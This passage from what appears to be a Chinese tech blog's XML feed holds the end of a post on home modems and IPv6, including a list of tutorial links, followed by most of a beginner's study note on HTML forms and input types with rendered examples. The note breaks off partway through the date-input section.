href="http://bbs.mydigit.cn/read.php?tid=1827084" target="_blank" rel="noopener">HG260GS-U光猫拆解与登录解码</a></p><p><a href="http://dragonbest520.com/2018/03/04/%e5%8c%97%e4%ba%ac%e8%81%94%e9%80%9a%e5%85%89%e5%ae%bd%e5%b8%a6%e5%8f%8aiptv%e6%8a%98%e8%85%be%e7%ac%94%e8%ae%b0%ef%bc%88%e4%ba%8c%ef%bc%89-%e5%8c%97%e4%ba%ac%e8%81%94%e9%80%9ahg260gs-u-wo-37/" target="_blank" rel="noopener">北京联通光宽带及IPTV折腾笔记（二）–北京联通HG260GS-U WO-37开启超级管理员的方法</a></p><p><a href="https://www.bilibili.com/video/av45203145" target="_blank" rel="noopener">轻松开启中国移动IPV6连接，早入畅游ipv6世界</a></p><p><a href="https://guanggai.org/thread-459-1-1.html" target="_blank" rel="noopener">烽火HG220G-U 2.03+ / HG2201U 5.0+光猫改桥接教程</a></p><p>etc.</p><p><em>（大部分都好古老了</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Server </tag>
            
            <tag> Web </tag>
            
            <tag> IPv6 </tag>
            
            <tag> Configuration </tag>
            
            <tag> Modem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FrontEnd | HTML 进阶学习笔记</title>
      <link href="/2020/02/18/FrontEnd_HTML_Advanced/"/>
      <url>/2020/02/18/FrontEnd_HTML_Advanced/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天过了一遍基础的 HTML 知识，记了点<a href="https://miaotony.xyz/2020/02/14/FrontEnd_HTML_Basic/">笔记在这里</a>。</p><p>总体感觉 HTML 果然是一门<strong>标记语言</strong>，其实它就是将要展示给用户的各种元素利用带有 <code>&lt;</code> <code>&gt;</code> 的标签标记好，浏览器再根据不同的标签渲染出不同的效果，呈现给用户。</p><p>HTML 可以说是搭了一个框架，而 CSS 则是把网页加以打扮，使其变得美观，JavaScript 则提供和拓展了网站与用户之间的交互功能。</p><p>这回就来学一学HTML中<strong>进阶</strong>的内容吧。（其实也不算进阶8</p><p>继续主要参考 W3School 的教程吧，也结合一点自己的小体会。</p><p><strong>由于博客自带了一些 CSS 样式，可能有些显示效果有所不同。</strong></p><br><h2 id="表单简介"><a href="#表单简介" class="headerlink" title="表单简介"></a>表单简介</h2><p>用于收集用户的输入。</p><h3 id="form-元素"><a href="#form-元素" class="headerlink" title="form 元素"></a>form 元素</h3><p><code>&lt;form&gt;</code> 元素用来定义 HTML 表单。</p><p>框架是这样</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- ...form elements（表单元素） ...  --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><h4 id="Action-属性"><a href="#Action-属性" class="headerlink" title="Action 属性"></a>Action 属性</h4><p><em><code>action</code> 属性</em>定义在提交表单时执行的动作。向服务器提交表单的通常做法是使用提交按钮（后面再说）。</p><p>利用 <code>action</code> 指定将信息发送到服务器的路径。</p><p>比如指定 <code>miao.php</code> 这个PHP脚本来处理提交的数据：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>RESTful API 的话，通常是指定某个路径，如 <code>/api/user</code>，通过 HTTP 的不同方法进行相应的处理。</p><p>如果省略 <code>action</code> 属性，则 <code>action</code> 会被设置为当前页面。</p><h4 id="Method-属性"><a href="#Method-属性" class="headerlink" title="Method 属性"></a>Method 属性</h4><p><em><code>method</code> 属性<em>规定在提交表单时所用的 HTTP 方法（</em>GET</em> 或 <em>POST</em>）。</p><p>省略的话默认为 GET 方法。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>GET 适合少量数据的提交（浏览器和服务器对URL长度有限制），数据会以 urlencode 的形式出现在 URL 的参数中，适合非敏感信息。</p><p>POST 适合大量数据的提交，且更有安全性，数据在 body 中提交，不会出现在URL中，适合包含敏感信息（例如密码）等情况。</p><p>不过二者本质上没有明显的差别，其实是在标准制定上有所不同而已。</p><h4 id="Name-属性"><a href="#Name-属性" class="headerlink" title="Name 属性"></a>Name 属性</h4><p>如果要正确地被提交，<strong>每个输入字段必须设置一个 <code>name</code> 属性</strong>。</p><p>若不含<code>name</code>属性，则不会向服务器提交这一项内容。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action="#">    First name:<br>    <input type="text" value="Mickey">    <br>    Last name:<br>    <input type="text" name="lastname" value="Mouse">    <br><br>    <input type="submit" value="Submit"></form> <br><p>（这个提交不会有反应的啦</p><h4 id="form-元素的完整属性"><a href="#form-元素的完整属性" class="headerlink" title="form 元素的完整属性"></a>form 元素的完整属性</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>action_page.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">accept-charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token attr-name">ectype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>application/x-www-form-urlencoded<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span> <span class="token attr-name">novalidate</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- ...form elements（表单元素） ...  --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>accept-charset</td><td>规定在被提交表单中使用的字符集（默认：页面字符集）。</td></tr><tr><td>action</td><td>规定向何处提交表单的地址（URL）（提交页面）。</td></tr><tr><td>autocomplete</td><td>规定浏览器应该自动完成表单（默认：开启<code>on</code>）。</td></tr><tr><td>enctype</td><td>规定被提交数据的编码（默认：<code>url-encoded</code>）。</td></tr><tr><td>method</td><td>规定在提交表单时所用的 HTTP 方法（默认：GET）。</td></tr><tr><td>name</td><td>规定识别表单的名称（对于 DOM 使用：document.forms.name）。</td></tr><tr><td>novalidate</td><td>规定浏览器不验证表单。</td></tr><tr><td>target</td><td>规定 action 属性中地址的目标（默认：<code>_self</code>）。</td></tr></tbody></table><hr><h3 id="用-fieldset-组合表单数据"><a href="#用-fieldset-组合表单数据" class="headerlink" title="用 fieldset 组合表单数据"></a>用 fieldset 组合表单数据</h3><p><code>&lt;fieldset&gt;</code> 元素组合表单中的相关数据。</p><p><code>&lt;legend&gt;</code> 元素为 <code>&lt;fieldset&gt;</code> 元素定义标题。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldset</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>legend</span><span class="token punctuation">></span></span>Personal information:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>legend</span><span class="token punctuation">></span></span>        First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/fieldset.png" alt="fieldset"></p><hr><h2 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h2><p><strong>表单元素</strong>指的是不同类型的 <strong>input 元素</strong>、<strong>复选框</strong>、<strong>单选按钮</strong>、<strong>提交按钮</strong>等等。</p><h3 id="input-元素"><a href="#input-元素" class="headerlink" title="input 元素"></a>input 元素</h3><p>最重要的<strong>表单元素</strong>。它有很多不同的 <em>type</em> 属性，比如：</p><table><thead><tr><th>类型type</th><th>描述</th></tr></thead><tbody><tr><td>text</td><td>定义常规文本输入。</td></tr><tr><td>radio</td><td>定义单选按钮输入（选择多个选择之一）</td></tr><tr><td>submit</td><td>定义提交按钮（提交表单）</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><h4 id="文本输入text、密码输入password"><a href="#文本输入text、密码输入password" class="headerlink" title="文本输入text、密码输入password"></a>文本输入text、密码输入password</h4><p><code>&lt;input type="text"&gt;</code> 定义用于<strong>文本输入</strong>的单行输入字段。</p><p><code>&lt;input type="password"&gt;</code> 定义<strong>密码字段</strong>。</p><p><strong>表单本身并不可见。</strong>文本字段的<strong>默认宽度是 20 个字符</strong>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form>    Username:<br>    <input type="text" name="username">    <br>    Password:<br>    <input type="password" name="password"></form> <br><p>上面这个密码，password 字段中的字符会被做掩码处理（显示为星号或实心圆）。</p><br><h4 id="单选按钮输入-radio"><a href="#单选按钮输入-radio" class="headerlink" title="单选按钮输入 radio"></a>单选按钮输入 radio</h4><p><code>&lt;input type="radio"&gt;</code> 定义单选按钮。</p><p>单选按钮允许用户在有限数量的选项中选择其中之一。</p><p>注意：<strong>name属性要相同</strong>，否则可以点击不同选项。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>male<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span><span class="token punctuation">></span></span>Male    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Female<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form>    <input type="radio" name="sex" value="male" checked="">Male    <br>    <input type="radio" name="sex" value="female">Female</form> <br><h4 id="复选框输入-checkbox"><a href="#复选框输入-checkbox" class="headerlink" title="复选框输入 checkbox"></a>复选框输入 checkbox</h4><p><code>&lt;input type="checkbox"&gt;</code> 定义复选框。</p><p>可以在有限数量的选项中选择零个或多个选项。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>animal<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cat<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>cat    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>animal<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dog<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>dog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form>    <input type="checkbox" name="animal" value="cat">cat    <br>    <input type="checkbox" name="animal" value="dog">dog</form> <br><p><em>（好像这个在博客里看不到效果i</em></p><h4 id="提交按钮-submit"><a href="#提交按钮-submit" class="headerlink" title="提交按钮 submit"></a>提交按钮 submit</h4><p><code>&lt;input type="submit"&gt;</code> 定义用于向表单处理程序<em>（form-handler）</em>提交表单的按钮。</p><p>表单处理程序通常是包含用来处理输入数据的脚本的服务器页面，就是前面说的<code>action</code>属性指定的。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action="#">    First name:<br>    <input type="text" name="firstname" value="Mickey">    <br>    Last name:<br>    <input type="text" name="lastname" value="Mouse">    <br><br>    <input type="submit" value="Submit"></form> <br><h4 id="按钮-button"><a href="#按钮-button" class="headerlink" title="按钮 button"></a>按钮 button</h4><p><code>&lt;input type="button"&gt;</code> 定义按钮。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(<span class="token punctuation">'</span>Hello World!<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click Me!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></code></pre><p><button type="button" onclick="alert('Hello World!')">Click Me!</button></p><br><p>通过<code>onclick</code>等属性来指定该按钮的功能。</p><hr><p>以下为HTML5中的新增的类型：</p><blockquote><p>color, date, datetime, datetime-local, email, month, number, range, search, tel, time, url, week</p></blockquote><h4 id="数字值的输入-number"><a href="#数字值的输入-number" class="headerlink" title="数字值的输入 number"></a>数字值的输入 number</h4><p><code>&lt;input type="number"&gt;</code> 用于应该包含数字值的输入字段。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Quantity (between 1 and 5):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>quantity<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Quantity (between 1 and 5):  <input type="number" name="quantity" min="1" max="5"></form><br><p>可以对输入进行限制，比如以下属性。</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>disabled</td><td>规定输入字段应该被禁用。</td></tr><tr><td>max</td><td>规定输入字段的最大值。</td></tr><tr><td>maxlength</td><td>规定输入字段的最大字符数。</td></tr><tr><td>min</td><td>规定输入字段的最小值。</td></tr><tr><td>pattern</td><td>规定通过其检查输入值的正则表达式。</td></tr><tr><td>readonly</td><td>规定输入字段为只读（无法修改）。</td></tr><tr><td>required</td><td>规定输入字段是必需的（必需填写）。</td></tr><tr><td>size</td><td>规定输入字段的宽度（以字符计）。</td></tr><tr><td>step</td><td>规定输入字段的合法数字间隔。</td></tr><tr><td>value</td><td>规定输入字段的默认值。</td></tr></tbody></table><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Quantity:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">step</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Quantity:  <input type="number" name="points" min="0" max="100" step="10" value="30"></form><br><p>有个坑，如果指定了<code>step</code>时，你指定的<code>max</code>属性的值不一定是可以取得到的呢。</p><p>比如min=1，max=100，step=10，则能取到的值为特定的1，11，21，…，91. 可以试一试。</p><form>  Quantity:  <input type="number" name="points" min="1" max="100" step="10"></form><br><h4 id="日期输入-date"><a href="#日期输入-date" class="headerlink" title="日期输入 date"></a>日期输入 date</h4><p>下面的几个都是日期选择器（Date Pickers）：</p><ul><li>date - 选取日、月、年</li><li>month - 选取月、年</li><li>week - 选取周和年</li><li>time - 选取时间（小时和分钟）</li><li>datetime - 选取时间、日、月、年（UTC 时间）</li><li>datetime-local - 选取时间、日、月、年（本地时间）</li></ul><br><p><code>&lt;input type="date"&gt;</code> 用于应该包含日期的输入字段。</p><p>点击后会弹出一个日期选择框，提交之后的值格式类似于 <code>day=2020-02-18</code>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  输入一个日期吧：  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>day<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form action="#">  输入一个日期吧：  <input type="date" name="day">  <input type="submit"></form><br><p>当然也可以<strong>添加限制</strong>啦。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Enter a date before 1990-01-01:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bday<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1989-12-31<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  Enter a date after 2020-01-01:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token 